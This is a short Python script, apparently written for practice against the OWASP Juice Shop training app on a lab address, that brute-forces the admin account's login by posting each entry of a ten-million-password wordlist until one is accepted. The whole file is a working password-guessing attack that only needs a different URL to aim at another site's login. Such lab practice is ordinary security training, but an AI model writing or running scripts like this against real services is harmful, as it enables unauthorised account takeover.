#!/usr/bin/env python

import requests
import string

f = open('/home/kali/Documents/SecLists/Passwords/xato-net-10-million-passwords.txt')

counter = 0
for line in f:
    r = requests.post('http://192.168.33.10:3000/rest/user/login', 
        data = {'email':'admin@juice-sh.op', 'password':string.strip(line)})
    counter += 1
    if r.content == 'Invalid email or password.':
        print('#' + str(counter)+' Failed '+line)
    else:    
        print('#' + str(counter)+' Success '+line)
        break
